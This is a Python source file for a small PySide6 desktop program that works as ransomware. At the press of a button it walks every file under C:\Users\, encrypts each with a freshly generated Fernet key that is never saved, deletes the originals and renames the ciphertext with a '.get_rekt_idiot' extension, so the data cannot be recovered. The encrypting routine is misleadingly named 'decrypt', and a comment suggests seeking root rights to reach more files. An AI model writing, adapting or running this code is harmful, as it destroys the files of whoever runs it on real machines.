# This Python file uses the following encoding: utf-8
import sys
import os

from PySide6.QtWidgets import QApplication, QWidget
from PySide6.QtCore import Signal, QThreadPool, QRunnable, QObject, Slot, QTranslator, QLocale, QSemaphore, Qt

from ui_form import Ui_Widget
from cryptography.fernet import Fernet


target_path = ["C:\\Users\\"]

key = Fernet.generate_key()
f = Fernet(key)

files_x = []


class WorkerSignals(QObject):
    progress = Signal(int)
    completed = Signal()



class find_files(QRunnable):
    def __init__(self):
        super().__init__()
        self.signals = WorkerSignals()

    def get_all_files(self, start_path):
        for path in start_path:
            for root, dirs, files in os.walk(path):
                for file in files:
                    # construct full file path
                    file_path = os.path.join(root, file)
                    files_x.append(file_path)

    def run(self):
        self.get_all_files(target_path)
        self.signals.completed.emit()


class EncryptingThread(QRunnable):
    def __init__(self):
        super().__init__()
        self.signals = WorkerSignals()

    def decrypt(self, filename):
        try:
            with open(filename, "rb") as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)

            os.remove(filename)

            with open(f"{filename}.get_rekt_idiot", "wb") as file:
                file.write(encrypted_data)

        except PermissionError:
            pass
            # You could make an additional function to prompt user to use root for this script

        except FileNotFoundError:
            pass


    def run(self):
        for idx, file in enumerate(files_x):
            self.decrypt(file)
            self.signals.progress.emit(idx)

        self.signals.completed.emit()


class Widget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.ui = Ui_Widget()
        self.ui.setupUi(self)

        self.threadpool = QThreadPool()

        self.ui.pushButton.clicked.connect(self.start)

    def start(self):
        get_files_thread = find_files()
        get_files_thread.signals.completed.connect(self.get_files_completed)
        self.threadpool.start(get_files_thread)


    def get_files_completed(self):
        self.ui.progressBar.setMaximum(len(files_x))

        encrypt_thread = EncryptingThread()
        encrypt_thread.signals.progress.connect(self.encrypt_progress)
        encrypt_thread.signals.completed.connect(self.encrypt_completed)
        self.threadpool.start(encrypt_thread)

    def encrypt_progress(self, progress):
        self.ui.progressBar.setValue(progress)

    def encrypt_completed(self):
        self.close()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    widget = Widget()
    widget.show()
    sys.exit(app.exec())
